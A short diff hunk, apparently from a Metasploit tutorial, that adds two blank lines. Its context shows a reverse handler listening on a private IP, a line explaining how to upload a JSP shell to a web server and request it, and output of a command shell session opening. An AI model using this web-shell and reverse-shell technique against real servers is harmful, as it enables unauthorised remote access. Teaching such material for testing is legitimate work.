@@ -36,6 +36,8 @@ msf exploit(handler) > exploit
 
 [*] Started reverse handler on 192.168.1.101:8080 
 [*] Starting the payload handler...
+
+
 At this point, we need to upload our shell to the remote web server that supports jsp files. With our file uploaded to the server, all that remains is for us to request the file in our browser and receive our shell.
 
 [*] Command shell session 1 opened (192.168.1.101:8080 -> 192.168.1.201:3914) at Thu Feb 24 19:55:35 -0700 2011
